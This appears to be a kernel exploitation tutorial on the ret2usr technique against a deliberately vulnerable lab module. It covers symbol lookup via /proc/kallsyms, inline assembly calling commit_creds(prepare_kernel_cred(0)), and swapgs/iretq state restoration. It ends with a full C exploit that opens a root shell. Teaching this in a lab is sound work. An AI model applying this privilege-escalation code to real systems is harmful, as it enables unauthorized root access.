---
description: ROPpety boppety, but now in the kernel
---

# Kernel ROP - ret2usr

## Introduction

By and large, the principle of userland ROP holds strong in the kernel. We still want to overwrite the return pointer, the only question is where.

The most basic of examples is the **ret2usr** technique, which is analogous to **ret2shellcode** - we write our own assembly that calls `commit_creds(prepare_kernel_cred(0))`, and overwrite the return pointer to point there.

## Vulnerable Module

{% hint style="info" %}
Note that the kernel version here is 6.1, due to some added protections we will come to later.
{% endhint %}

{% file src="../../.gitbook/assets/rop_ret2usr.zip" %}

The relevant code is here:

```c
static ssize_t rop_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos) {
    char buffer[0x20];

    printk(KERN_INFO "Testing...");
    memcpy(buffer, buf, 0x100);

    printk(KERN_INFO "Yes? %s", buffer);

    return 0;
}
```

As we can see, it's a size `0x100` `memcpy` into an `0x20` buffer. Not the hardest thing in the world to spot. The second `printk` call here is so that `buffer` is used somewhere, otherwise it's just optimised out by `make` and the entire function just becomes `xor eax, eax; ret`!

## Exploitation

### Assembly to escalate privileges

Firstly, we want to find the location of `prepare_kernel_cred()` and `commit_creds()`. We can do this by reading `/proc/kallsyms`, a file that contains all of the kernel symbols and their locations (including those of our kernel modules!). This will remain **constant**, as we have disabled [KASLR](kaslr.md).

{% hint style="warning" %}
For obvious reasons, you require **root** permissions to read this file!
{% endhint %}

```bash
~ # cat /proc/kallsyms | grep cred
[...]
ffffffff81066e00 T commit_creds
ffffffff81066fa0 T prepare_kernel_cred
[...]
```

Now we know the locations of the two important functions: After that, the assembly is pretty simple. First we call `prepare_kernel_cred(0)`:

```
xor    rdi, rdi
mov    rcx, 0xffffffff81066fa0
call   rcx
```

Then we call `commit_creds()` on the result (which is stored in RAX):

```
mov    rdi, rax
mov    rcx, 0xffffffff81066e00
call   rcx
```

We can throw this directly into the C code using inline assembly:

```c
void escalate() {
    __asm__(
        ".intel_syntax noprefix;"
        "xor rdi, rdi;"
        "movabs rcx, 0xffffffff81066fa0;"   // prepare_kernel_cred
	"call rcx;"
        
        "mov rdi, rax;"
	"movabs rcx, 0xffffffff81066e00;"   // commit_creds
	"call rcx;"
    );
}
```

### Overflow

The next step is overflowing. The 7th `qword` overwrites RIP:

```c
// overflow
uint64_t payload[7];

payload[6] = (uint64_t) escalate;

write(fd, payload, 0);
```

Finally, we create a `get_shell()` function we call at the end, once we've escalated privileges:

```c
void get_shell() {
    system("/bin/sh");
}

int main() {
    // [ everything else ]
    
    get_shell();
}
```

### Returning to userland

If we run what we have so far, we fail and the kernel panics. Why is this?

The reason is that once the kernel executes `commit_creds()`, it doesn't return back to user space - instead it'll pop the next junk off the stack, which causes the kernel to crash and panic! You can see this happening while you debug (which [we'll cover soon](debugging-a-kernel-module.md)).

What we have to do is **force the kernel to swap back to user mode**. The way we do this is by **saving the initial userland register state** from the start of the program execution, then once we have escalate privileges in kernel mode, we **restore the registers to swap to user mode**. This reverts execution to the exact state it was before we ever entered kernel mode!

We can store them as follows:

```c
uint64_t user_cs;
uint64_t user_ss;
uint64_t user_rsp;
uint64_t user_rflags

void save_state() {
    puts("[*] Saving state");

    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_rsp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );

    puts("[+] Saved state");
}
```

The CS, SS, RSP and RFLAGS registers are stored in 64-bit values within the program. To restore them, we append extra assembly instructions in `escalate()` for after the privileges are acquired:

```c
uint64_t user_rip = (uint64_t) get_shell;

void escalate() {
    __asm__(
        ".intel_syntax noprefix;"
        "xor rdi, rdi;"
        "movabs rcx, 0xffffffff81066fa0;"   // prepare_kernel_cred
	"call rcx;"
        
        "mov rdi, rax;"
	"movabs rcx, 0xffffffff81066e00;"   // commit_creds
	"call rcx;"

        // restore all the registers
        "swapgs;"
        "mov r15, user_ss;"
        "push r15;"
        "mov r15, user_rsp;"
        "push r15;"
        "mov r15, user_rflags;"
        "push r15;"
        "mov r15, user_cs;"
        "push r15;"
        "mov r15, user_rip;"
        "push r15;"
        "iretq;"
        ".att_syntax;"
    );
}
```

Here the GS, CS, SS, RSP and RFLAGS registers are restored to bring us back to user mode (GS via the `swapgs` instruction). The RIP register is updated to point to `get_shell` and pop a shell.&#x20;

If we compile it statically and load it into the `initramfs.cpio`, notice that our privileges are elevated!

```
$ gcc -static -o exploit exploit.c
[...]
$ ./run.sh
~ $ ./exploit 
[*] Saving state
[+] Saved state
FD: 3
[*] Returned to userland
~ # id
uid=0(root) gid=0(root)
```

We have successfully exploited a ret2usr!

### Understanding the restoration

How exactly does the above assembly code restore registers, and why does it return us to user space? To understand this, we have to know what [all of the registers](https://www.sciencedirect.com/topics/computer-science/segment-register) do. The switch to kernel mode is best explained by [a literal StackOverflow post](https://stackoverflow.com/questions/2479118/cpu-switches-from-user-mode-to-kernel-mode-what-exactly-does-it-do-how-does-i), or [another one](https://stackoverflow.com/questions/5223813/how-does-the-kernel-know-if-the-cpu-is-in-user-mode-or-kenel-mode).

* [GS - limited segmentation, often holding a base address to a structure containing per-CPU data](https://wiki.osdev.org/SWAPGS)
  * Has to vary between user space and kernel space
* SS - Stack Segment
  * Defines where the stack is stored
  * Must be reverted back to the userland stack
* RSP
  * Same as above, really
* CS - Code Segment
  * Defines the memory location that instructions are stored in
  * Must point to our user space code
* RFLAGS - [various things](https://wiki.osdev.org/CPU\_Registers\_x86#EFLAGS\_Register)

GS is changed back via the `swapgs` instruction. All others are changed back via [`iretq`](https://www.felixcloutier.com/x86/iret:iretd:iretq), the QWORD variant of the `iret` family of intel instructions. The intent behind `iretq` is to be **the** way to return from exceptions, and it is specifically designed for this purpose, as seen in Vol. 2A 3-541 of the [Intel Software Developer’s Manual](https://www.intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html):

> Returns program control from an exception or interrupt handler to a program or procedure that was interrupted by an exception, an external interrupt, or a software-generated interrupt. These instructions are also used to perform a return from a nested task. (A nested task is created when a CALL instruction is used to initiate a task switch or when an interrupt or exception causes a task switch to an interrupt or exception handler.)
>
> \[...]
>
> During this operation, the processor pops the return instruction pointer, return code segment selector, and EFLAGS image from the stack to the EIP, CS, and EFLAGS registers, respectively, and then resumes execution of the interrupted program or procedure.

As we can see, it pops all the registers off the stack, which is why we push the saved values **in that specific order**. It may be possible to restore them sequentially without this instruction, but that increases the likelihood of things going wrong as one restoration may have an adverse effect on the following - much better to just use `iretq`.

## Final Exploit

The final version

```c
// gcc -static -o exploit exploit.c

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <stdint.h>

void get_shell(void){
    puts("[*] Returned to userland");
    system("/bin/sh");
}

uint64_t user_cs;
uint64_t user_ss;
uint64_t user_rsp;
uint64_t user_rflags;

uint64_t user_rip = (uint64_t) get_shell;

void save_state(){
    puts("[*] Saving state");

    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_rsp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );

    puts("[+] Saved state");
}

void escalate() {
    __asm__(
        ".intel_syntax noprefix;"
        "xor rdi, rdi;"
        "movabs rcx, 0xffffffff81066fa0;"   // prepare_kernel_cred
	    "call rcx;"
        
        "mov rdi, rax;"
	    "movabs rcx, 0xffffffff81066e00;"   // commit_creds
	    "call rcx;"

        "swapgs;"
        "mov r15, user_ss;"
        "push r15;"
        "mov r15, user_rsp;"
        "push r15;"
        "mov r15, user_rflags;"
        "push r15;"
        "mov r15, user_cs;"
        "push r15;"
        "mov r15, user_rip;"
        "push r15;"
        "iretq;"
        ".att_syntax;"
    );
}

int main() {
    save_state();

    // communicate with the module
    int fd = open("/dev/kernel_rop", O_RDWR);
    printf("FD: %d\n", fd);

    // overflow
    uint64_t payload[7];

    payload[6] = (uint64_t) escalate;

    write(fd, payload, 0);
}
```
